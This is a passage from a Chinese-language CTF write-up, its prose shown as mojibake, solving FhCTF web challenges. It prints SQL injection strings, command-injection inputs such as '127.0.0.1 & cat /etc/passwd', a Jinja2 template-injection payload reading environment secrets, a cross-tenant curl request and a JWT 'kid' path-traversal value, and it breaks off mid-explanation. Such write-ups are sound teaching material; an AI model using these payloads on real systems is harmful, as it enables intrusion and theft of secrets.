<p>ç‚ºäº†è®“errorå‡ºç¾åœ¨ç¬¬ 1 è¡Œï¼Œå°‡ç¨‹å¼ç¢¼å…§å®¹è¨­ç‚ºå–®ä¸€ &quot;(&quot;ï¼Œbackendæœƒå†å˜—è©¦è®€å– <code>filename</code> çš„ç¬¬ 1 è¡Œä¸¦é¡¯ç¤ºåœ¨errorä¸­ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">monaco.editor.getModels()[<span class="number">0</span>].setValue(<span class="string">&quot;(&quot;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.querySelector(<span class="string">&#x27;input[name=&quot;filename&quot;]&#x27;</span>).value = <span class="string">&#x27;/proc/self/environ&#x27;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(<span class="string">&#x27;compileForm&#x27;</span>).submit();</span><br></pre></td></tr></table></figure>
<p>åœ¨errorä¸­å¯ä»¥çœ‹åˆ° <code>/proc/self/environ</code> çš„è¼¸å‡ºï¼Œå¯ä»¥å¾—åˆ°åŒ…å«<code>FLAG=</code> çš„ environment variableã€‚</p>
<p>æœ€å¾Œå°±å¯ä»¥æ‹¿åˆ°flag</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;N0t_s4f3_t0_ou7put_th3_err0r_m5g&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="survey"><a class="markdownIt-Anchor" href="#survey"></a> Survey</h2>
<h3 id="survey-2"><a class="markdownIt-Anchor" href="#survey-2"></a> Survey</h3>
<p><img src="/images/FhCTF/4.webp" alt="image" /></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;Th4nk_y0u_f0r_y0ur_f33db4ck_7hCTF&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="internal-login"><a class="markdownIt-Anchor" href="#internal-login"></a> INTERNAL LOGIN</h3>
<p><img src="/images/FhCTF/5.webp" alt="image" /></p>
<p>å®¢æˆ¶ç«¯ SQL æ³¨å…¥æ¨¡æ“¬ï¼Œåœ¨ Username æ¬„ä½è¼¸å…¥</p>
<ul>
<li>â€™ or 1=1â€“</li>
<li>â€™ OR '1'='1</li>
<li>adminâ€™ or 1=1â€“</li>
<li>â€™ || 1=1â€“</li>
<li>anythingâ€™ or 'a'='a</li>
</ul>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;SQL_1nj_42_&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="web-robots"><a class="markdownIt-Anchor" href="#web-robots"></a> Web Robots</h3>
<p>robots.txt å°ï¼Œå°±æ˜¯ robots.txt<br />
<img src="/images/FhCTF/6.webp" alt="image" /></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-Agent *</span><br><span class="line"></span><br><span class="line">Disallow /secret</span><br></pre></td></tr></table></figure>
<p>é‚£æˆ‘å€‘å°±ç›´æ¥é€²/secretçœ‹å§</p>
<p><img src="/images/FhCTF/7.webp" alt="image" /></p>
<p>é€² /secret å¾Œæœƒè·³è½‰åˆ° /secret/index.html ï¼Œé‚£å¾ˆæ˜é¡¯æˆ‘å€‘çœ‹çš„å‡ºä¾†ä¸Šä¸€æ­¥å°±æ˜¯ç›®éŒ„</p>
<p><img src="/images/FhCTF/8.webp" alt="image" /></p>
<p><img src="/images/FhCTF/9.webp" alt="image" /></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;r0b075_4r3_n0t_v15ible_in_tx7&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="doors-open"><a class="markdownIt-Anchor" href="#doors-open"></a> Doors Open</h3>
<p><img src="/images/FhCTF/10.webp" alt="image" /></p>
<p>ä¸€æ¨£å…ˆçœ‹ robots.txt</p>
<p><img src="/images/FhCTF/11.webp" alt="image" /></p>
<p>é‚£å°±é€² /doors çœ‹çœ‹å§</p>
<p><img src="/images/FhCTF/12.webp" alt="image" /></p>
<p>é€™è£¡é»é–‹ç›´æ¥æ˜¯ /door/1 ï¼Œ é‚£æˆ‘å€‘å°±é–‹å§‹ç”¨Burpè·‘0~10000ï¼Œç™¼ç¾éƒ½ä¸æ˜¯ï¼Œ<br />
çœ‹è‘—è¶Šä¾†è¶Šå¤šäººè§£ï¼Œå°±æƒ³èªªæ‡‰è©²æ²’é‚£éº¼é›£å§ï¼Œæ‰€ä»¥å°±æƒ³èªªæœƒä¸æœƒæ˜¯è² æ•¸â€¦</p>
<p><img src="/images/FhCTF/13.webp" alt="image" /></p>
<h3 id="the-visual-blind-spot"><a class="markdownIt-Anchor" href="#the-visual-blind-spot"></a> The Visual Blind Spot</h3>
<p>è¨ˆç®—æ­£ç¢ºçš„ RGB å¯†é‘°</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _base = <span class="built_in">parseInt</span>(<span class="string">&quot;32&quot;</span>, <span class="number">16</span>); <span class="comment">// &quot;32&quot; (åå…­é€²ä½) = 50 (åé€²ä½)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _kMap = &#123; </span><br><span class="line">    <span class="attr">x</span>: _base &lt;&lt; <span class="number">1</span>,  <span class="comment">// 50 &lt;&lt; 1 = 100</span></span><br><span class="line">    <span class="attr">y</span>: _base,       <span class="comment">// 50</span></span><br><span class="line">    <span class="attr">z</span>: _base &lt;&lt; <span class="number">2</span>   <span class="comment">// 50 &lt;&lt; 2 = 200</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>æ­£ç¢ºçš„ RGB å€¼ï¼š</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">R</span> <span class="operator">=</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">G</span> <span class="operator">=</span> <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">B</span> <span class="operator">=</span> <span class="number">200</span></span><br></pre></td></tr></table></figure>
<p>è§£å¯† sys-config æ•¸æ“š<br />
data-params åŒ…å«åŠ å¯†çš„æ•¸æ“šï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">249|351|240|291|249|408|288|387|369|192|330|366|324|240|186|375|351|192|375|414</span><br></pre></td></tr></table></figure>
<p>è§£å¯†å…¬å¼ï¼šcharCode = (n / 3) - 13</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;Stn3am_C1ph3p&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="system-root-shell"><a class="markdownIt-Anchor" href="#system-root-shell"></a> SYSTEM ROOT SHELL</h3>
<p><img src="/images/FhCTF/14.webp" alt="image" /></p>
<p>åœ¨ script æ¨™ç±¤ä¸­ç™¼ç¾</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line"><span class="keyword">const</span> _obs = [<span class="number">82</span>, <span class="number">67</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">118</span>, <span class="number">51</span>]; </span><br><span class="line"><span class="keyword">const</span> _h = [<span class="number">70</span>, <span class="number">104</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">70</span>, <span class="number">123</span>]; </span><br><span class="line"><span class="keyword">const</span> isInject = <span class="regexp">/[;&amp;|]/</span>.<span class="title function_">test</span>(cmd);</span><br></pre></td></tr></table></figure>
<p>ASCII ç¢¼æ•¸çµ„è½‰æ›ç‚ºå­—å…ƒ</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">_h</span> â†’ <span class="string">&quot;FhCTF&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">_obs</span> â†’ <span class="string">&quot;RCE__v3&quot;</span></span><br><span class="line"></span><br><span class="line">æœ€å¾ŒåŠ ä¸Š <span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>è§¸ç™¼æ–¹å¼</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> | whoami</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> &amp; <span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;RCE__v3&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="welcome-to-cybersecurity-jungle"><a class="markdownIt-Anchor" href="#welcome-to-cybersecurity-jungle"></a> Welcome to Cybersecurity Jungle</h3>
<p><img src="/images/FhCTF/15.webp" alt="image" /><br />
ä¸€é€²ä¾†æœƒçœ‹åˆ°ä¸Šé¢çš„ç•«é¢ï¼Œçœ‹ HTML sourceæ™‚,æ³¨æ„åˆ° title æ¨™ç±¤åŒ…å«ä¸€æ®µæ—¥æ–‡</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¨€èªï¼ˆã’ã‚“ã”ï¼‰ã‚’å¤‰ï¼ˆã‹ï¼‰ãˆã¦ã‚‚ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°ã®æœ¬è³ªï¼ˆã»ã‚“ã—ã¤ï¼‰ã¯å¤‰ï¼ˆã‹ï¼‰ã‚ã‚‰ãªã„ã€‚</span><br></pre></td></tr></table></figure>
<p>æ„æ—¨ &quot;å³ä½¿æ”¹è®Šèªè¨€ï¼Œç·¨ç¨‹çš„æœ¬è³ªä¹Ÿä¸æœƒæ”¹è®Š</p>
<p>é¡Œç›®çš„é—œéµåœ¨æ–¼è¨­ç½®æ­£ç¢ºçš„ Cookie</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie åç¨± (<span class="keyword">Base64 </span>ç·¨ç¢¼): aXNGbGFnU2hvdzJ1</span><br></pre></td></tr></table></figure>
<p>è§£ç¢¼å¾Œ:  <code>isFlagShow2u</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span> å€¼ (Base64 ç·¨ç¢¼): <span class="number">44</span>Go44GF44KL44O8</span><br></pre></td></tr></table></figure>
<p>è§£ç¢¼å¾Œ: <code>ã¨ã…ã‚‹ãƒ¼ (æ—¥æ–‡çš„ &quot;true&quot;)</code></p>
<p>æ¥ä¸‹ä¾†é€²åˆ° Application æ”¹ cookie å€¼å¾Œé‡æ–°æ•´ç†å³å¯</p>
<p><img src="/images/FhCTF/16.webp" alt="image" /></p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Th<span class="number">3_</span>e<span class="number">553n</span>c<span class="number">3_</span><span class="keyword">of</span><span class="number">_p</span>r<span class="number">0</span>gramm<span class="number">1n</span><span class="number">6_</span><span class="keyword">is</span><span class="number">_</span>ind<span class="number">3p</span><span class="number">3n</span>den<span class="number">7_</span><span class="keyword">of</span><span class="number">_</span>the<span class="number">_</span>languag<span class="number">3_u</span><span class="number">53</span>d&#125;</span><br></pre></td></tr></table></figure>
<h3 id="templating-danger"><a class="markdownIt-Anchor" href="#templating-danger"></a> Templating Danger</h3>
<p>SSTIé¡Œ</p>
<p>ç¹éæ–¹æ³•:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;\\u&quot;</span> <span class="keyword">in</span> val:</span><br><span class="line">    normalize_val = val.encode(<span class="string">&quot;utf-8&quot;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">    context[context_key] = Template(normalize_val).render()</span><br></pre></td></tr></table></figure>
<p>ç•¶è¼¸å…¥åŒ…å« \u æ™‚ï¼Œç³»çµ±æœƒåŸ·è¡Œ Unicode è§£ç¢¼ï¼Œç„¶å¾Œåœ¨éæ¿¾å¾Œç›´æ¥ç”¨ Jinja2 çš„ Template().render() æ¸²æŸ“å…§å®¹ã€‚é€™å…è¨±æˆ‘å€‘ä½¿ç”¨ Unicode ç·¨ç¢¼ç¹éæ‹¬è™Ÿéæ¿¾ã€‚</p>
<p>Payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u007b\u007bcycler.__init__.__globals__.os.environ[<span class="string">&#x27;FLAG&#x27;</span>]\u007d\u007d</span><br></pre></td></tr></table></figure>
<p><img src="/images/FhCTF/17.webp" alt="image" /></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;T3mpl371ng_n33d_t0_b3_m0r3_c4r3fullğŸ¥¹&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="documents"><a class="markdownIt-Anchor" href="#documents"></a> Documents</h3>
<p>ä¸€é€²ä¾†çœ‹ç…§æ…£ä¾‹çœ‹sourcesï¼Œæ‰¾å‡ºéš±è—å­—å…ƒ<br />
<img src="/images/FhCTF/18.webp" alt="image" /></p>
<ul>
<li>&quot;HTTP Header å‘Šè¨´äº†ä½ ä¸€åˆ‡&quot;</li>
</ul>
<p>æª¢æŸ¥ HTTP æ¨™é ­ç™¼ç¾: powerby: FastAPI<br />
FastAPI é€šå¸¸æœ‰ /openapi.json ç«¯é»<br />
<img src="/images/FhCTF/19.webp" alt="image" /><br />
å¯ä»¥ç™¼ç¾ /flag.html ç«¯é»éœ€è¦ Referer æ¨™é ­ï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦å½é€ ä»–</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://9f1604e5.fhctf.systems/flag.html&quot;</span> `</span><br><span class="line">    <span class="literal">-Headers</span> <span class="selector-tag">@</span>&#123;<span class="string">&quot;Referer&quot;</span>=<span class="string">&quot;https://localhost.app:8000/index.html&quot;</span>&#125; `</span><br><span class="line">    <span class="literal">-UseBasicParsing</span> | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> Content</span><br></pre></td></tr></table></figure>
<p><img src="/images/FhCTF/20.webp" alt="image" /></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;URL_encod3d_m337_p47h_d15cl0sureğŸ˜±ğŸ˜±&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="log-access"><a class="markdownIt-Anchor" href="#log-access"></a> LOG ACCESS</h3>
<p><img src="/images/FhCTF/21.webp" alt="image" /></p>
<p>é€™é¡Œæä¾›äº†ä¸€å€‹ã€Œå®‰å…¨çš„æ—¥èªŒè®€å–å·¥å…·ã€ï¼Œè²ç¨±èƒ½åµæ¸¬ä¸¦é˜»æ“‹æ‰€æœ‰ Path Traversal æ”»æ“Š ã€‚é¡Œç›®æ˜ç¢ºæç¤ºï¼šé€™å€‹å·¥å…·å®Œå…¨æ²’æœ‰å¾Œç«¯ï¼Œæ‰€æœ‰åˆ¤æ–·ä¼¼ä¹éƒ½åœ¨ç€è¦½å™¨ä¸­å®Œæˆã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> check1 = input.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> &gt; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> check2 = input.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;flag&#x27;</span>) !== -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (check1 &amp;&amp; check2) &#123;</span><br><span class="line">    <span class="keyword">const</span> final = _h + <span class="string">&quot;&#123;&quot;</span> + _c1 + _c3 + <span class="string">&quot;_&quot;</span> + _c2 + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    output.<span class="property">innerText</span> = <span class="string">&quot;ACCESS_GRANTED:\n&quot;</span> + final;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é©—è­‰æ¢ä»¶éå¸¸æ¸…æ¥šï¼š</p>
<ul>
<li>check1ï¼šè¼¸å…¥å¿…é ˆåŒ…å«è¶…é 3 å€‹é»ï¼ˆ. å­—å…ƒï¼‰</li>
<li>check2ï¼šè¼¸å…¥å¿…é ˆåŒ…å« &quot;flag&quot; å­—ä¸²ï¼ˆä¸å€åˆ†å¤§å°å¯«ï¼‰</li>
</ul>
<p>æ··æ·†å­—ä¸²è§£ç¢¼<br />
JavaScript ä¸­ä½¿ç”¨äº†å¹¾å€‹æ··æ·†çš„è®Šæ•¸ ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _h = [<span class="number">70</span>, <span class="number">104</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">70</span>].<span class="title function_">map</span>(<span class="function"><span class="params">c</span> =&gt;</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(c)).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">// ASCII è§£ç¢¼ï¼šFhCTF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _c1 = <span class="string">&quot;\x50\x61\x74\x68\x5f&quot;</span>;</span><br><span class="line"><span class="comment">// Hex è§£ç¢¼ï¼šPath_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _c2 = (<span class="number">21337</span> &gt;&gt; <span class="number">4</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line"><span class="comment">// ä½å…ƒé‹ç®—ï¼š21337 &gt;&gt; 4 = 1333ï¼Œè½‰ hex = 535</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _c3 = <span class="string">&quot;\x54\x72\x34\x76&quot;</span>;</span><br><span class="line"><span class="comment">// Hex è§£ç¢¼ï¼šTr4v</span></span><br></pre></td></tr></table></figure>
<p>çµ„åˆèµ·ä¾†</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;Path_Tr4v_535&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="pathway-leak"><a class="markdownIt-Anchor" href="#pathway-leak"></a> Pathway-leak</h3>
<p>æ‰“é–‹é¡Œç›®ç¶²ç«™ï¼Œè§€å¯Ÿæª”æ¡ˆç®¡ç†ä»‹é¢èˆ‡ç¶²é åŸå§‹ç¢¼ã€‚<br />
<img src="/images/FhCTF/22.webp" alt="image" /></p>
<p>åœ¨ <code>&lt;script&gt;</code> å€å¡Šä¸­ç™¼ç¾æª”æ¡ˆè¼‰å…¥æ˜¯å‘¼å«ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">TENANT</span> = <span class="string">&#x27;guest_user&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> url = <span class="string">`/api/assets/<span class="subst">$&#123;TENANT&#125;</span>/<span class="subst">$&#123;filename&#125;</span>`</span>;</span><br></pre></td></tr></table></figure>
<p>é¡Œç›®å¦å¤–æä¾›çš„æª”æ¡ˆæ¸…å–®é¡¯ç¤ºä¼ºæœå™¨ä¸Šé‚„å­˜åœ¨ï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">secret_admin</span>/flag.txt (<span class="number">38</span>B)</span><br></pre></td></tr></table></figure>
<p>æ¨è«–å¾Œç«¯ API å¾ˆå¯èƒ½æ²’æœ‰æª¢æŸ¥ç›®å‰ä½¿ç”¨è€…æ˜¯å¦çœŸçš„å±¬æ–¼è©² tenantï¼Œå› æ­¤ç›´æ¥å˜—è©¦è·¨ tenant è«‹æ±‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://71c21714.fhctf.systems/api/assets/secret_admin/flag.txt</span><br></pre></td></tr></table></figure>
<p>ä¼ºæœå™¨å›æ‡‰ HTTP 200ï¼Œå…§å®¹ç‚ºï¼š</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;p4th_tr4v3rs4l_w3_w4n7_t0_av01d&#125;</span><br></pre></td></tr></table></figure>
<h3 id="kid"><a class="markdownIt-Anchor" href="#kid"></a> KID</h3>
<p>é€²å…¥é¡Œç›®ç¶²é å¾Œï¼Œå…ˆæ‰“é–‹ç€è¦½å™¨çš„ã€Œæª¢æŸ¥å…ƒç´  / é–‹ç™¼è€…å·¥å…·ã€ï¼Œåœ¨åŸå§‹ç¢¼èˆ‡ console/log å€å¯ä»¥çœ‹åˆ°å¹¾æ®µ Debug è¨Šæ¯ï¼Œç›´æ¥æ´©æ¼äº†å¾Œç«¯çš„é©—è­‰é‚è¼¯ï¼š</p>
<ul>
<li>
<p>é‡‘é‘°è·¯å¾‘ Debugï¼š</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Fetching key from: /app/keys/default.pem</span><br></pre></td></tr></table></figure>
<p>é€™ä»£è¡¨ä¼ºæœå™¨æœƒæ ¹æ“š JWT Header è£¡çš„ <code>kid</code>ï¼ˆKey IDï¼‰å»æª”æ¡ˆç³»çµ±è®€å–é‡‘é‘°ï¼Œä¾‹å¦‚ <code>kid = &quot;default.pem&quot;</code> å°æ‡‰ <code>/app/keys/default.pem</code>ã€‚</p>
</li>
<li>
<p>å±éšªçš„ç›¸å®¹æ¨¡å¼ï¼š</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] HS256 Compatibility Mode: Enabled</span><br></pre></td></tr></table></figure>
<p>é€™è¡¨ç¤ºä¼ºæœç«¯åœ¨é©—è­‰ JWT æ™‚ï¼ŒåŒæ™‚æ”¯æ´éå°ç¨±ï¼ˆRS256ï¼‰èˆ‡å°ç¨±ï¼ˆHS256ï¼‰æ¨¡å¼ï¼Œè€Œä¸”å¯¦ä½œæ–¹å¼å­˜åœ¨æ¼”ç®—æ³•æ··æ·†é¢¨éšªã€‚</p>
</li>
<li>
<p>ç›®å‰æ¬Šé™ï¼šé é¢é¡¯ç¤ºç™»å…¥èº«ä»½ç‚º <code>guest</code>ï¼Œé¡¯ç„¶ç›®æ¨™æ˜¯å½é€  Token å–å¾— <code>admin</code> æ¬Šé™ã€‚</p>
</li>
</ul>
<p>æ¥è‘—å¾ Cookie ä¸­å–å‡º JWTï¼ˆä¾‹å¦‚ <code>access_token</code>ï¼‰ï¼Œä¸Ÿåˆ° <a target="_blank" rel="noopener" href="http://jwt.io">jwt.io</a> è§€å¯Ÿå…§å®¹ï¼Œå¯ä»¥å¾—åˆ°é¡ä¼¼çµæ§‹ï¼š</p>
<ul>
<li>Headerï¼š<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default.pem&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li>Payloadï¼š<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;guest&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1704350000</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>é€™äº›è³‡è¨Šå·²ç¶“è¶³å¤ åˆ¤æ–·ï¼šä¼ºæœå™¨æœƒä¾ <code>kid</code> å»è®€æª”æ¡ˆï¼Œä¸¦ç”¨å…¶ä¸­å…§å®¹ç•¶ä½œé‡‘é‘°ä¾†é©—è­‰ JWTã€‚</p>
<ul>
<li>æ¼æ´åŸç†åˆ†æ</li>
</ul>
<p>é€™é¡Œçµåˆäº†å…©å€‹å¸¸è¦‹éŒ¯èª¤ï¼š<strong>Directory Traversal</strong> + <strong>JWT Algorithm Confusion</strong>ã€‚</p>
<ul>
<li>
<p>Directory Traversal (ç›®éŒ„éæ­·)</p>
<p>å¾Œç«¯å¯¦ä½œæ¦‚å¿µå¤§è‡´é¡ä¼¼ï¼š</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kid = header[<span class="string">&quot;kid&quot;</span>]</span><br><span class="line">key_path = <span class="string">&quot;/app/keys/&quot;</span> + kid</span><br><span class="line">key_data = <span class="built_in">open</span>(key_path, <span class="string">&quot;rb&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<p>è‹¥ <code>kid</code> æ²’æœ‰éæ¿¾ <code>../</code>ï¼Œæ”»æ“Šè€…å¯ä»¥å‚³å…¥åƒæ˜¯ï¼š</p>
  <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../dev/null</span><br></pre></td></tr></table></figure>
<p>è®“ä¼ºæœå™¨å¯¦éš›å»é–‹å•Ÿçš„è·¯å¾‘è®Šæˆ <code>/dev/null</code>ï¼Œè€Œä¸æ˜¯é æœŸçš„ <code>/app/keys/default.pem</code>ã€‚<br />
é›–ç„¶æˆ‘å€‘çœ‹ä¸åˆ°æª”æ¡ˆå…§å®¹ï¼Œä½†ä¼ºæœå™¨æœƒã€Œè‡ªå·±ã€å¹«æˆ‘å€‘è¼‰å…¥ï¼Œä¸¦ç•¶æˆé‡‘é‘°ä½¿ç”¨ï¼Œé€™å°±æ˜¯åˆ©ç”¨é»ã€‚</p>
</li>
<li>
<p>JWT Algorithm Confusion (æ¼”ç®—æ³•æ··æ·†)</p>
